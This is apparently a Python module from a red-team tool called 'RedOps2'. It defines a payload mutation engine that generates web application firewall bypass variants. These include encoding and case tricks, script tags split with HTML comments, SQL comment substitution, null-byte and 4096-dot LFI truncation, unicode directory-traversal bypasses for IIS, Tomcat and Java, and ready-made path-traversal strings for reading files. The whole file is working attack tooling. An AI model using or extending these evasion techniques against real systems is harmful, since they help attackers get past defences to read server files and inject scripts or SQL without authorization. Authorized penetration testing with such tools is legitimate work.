import urllib.parse
import html
import random
import base64

class PayloadMutator:
    """
    The 'Mutation Engine' ported from RedOps2.
    Responsible for generating WAF-bypassing variants of a base payload.
    """

    @staticmethod
    def mutate(payload, strategies=None):
        """
        Generates a list of mutated payloads based on selected strategies.
        If strategies is None, applies all relevant defaults.
        """
        variants = set()
        variants.add(payload) # Always include original
        
        if not strategies:
            strategies = ["url_encode", "double_url", "html_entity"]
            
        for strategy in strategies:
            if strategy == "url_encode":
                variants.add(urllib.parse.quote(payload))
            elif strategy == "double_url":
                variants.add(urllib.parse.quote(urllib.parse.quote(payload)))
            elif strategy == "html_entity":
                variants.add(html.escape(payload))
            elif strategy == "null_byte":
                variants.add(payload + "%00")
            elif strategy == "case_toggle":
                variants.add(PayloadMutator._toggle_case(payload))
            elif strategy == "comment_split":
                if "<script>" in payload:
                    variants.add(payload.replace("<script>", "<scr<!-- -->ipt>"))
            elif strategy == "sql_comment":
                variants.add(payload.replace(" ", "/**/"))
            elif strategy == "path_truncation":
                # Typical LFI truncation
                variants.add(payload + ("." * 4096))
            elif strategy == "unicode_traversal":
                # IIS/Tomcat/Java bypasses
                variants.add(payload.replace("../", "..%c0%af"))
                variants.add(payload.replace("../", "..%252f"))
                variants.add(payload.replace("../", "..%c1%9c"))
                
        return list(variants)

    @staticmethod
    def _toggle_case(s):
        return "".join(c.lower() if i % 2 else c.upper() for i, c in enumerate(s))

    @staticmethod
    def encode_base64(payload):
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def generate_lfi_variants(file_path):
        """
        Specific LFI variants logic from RedOps2
        """
        payloads = [
            file_path,
            "../../../../" + file_path.lstrip("/"),
            "....//....//....//" + file_path.lstrip("/"),
            "..%252f..%252f..%252f" + file_path.lstrip("/"),
        ]
        return payloads
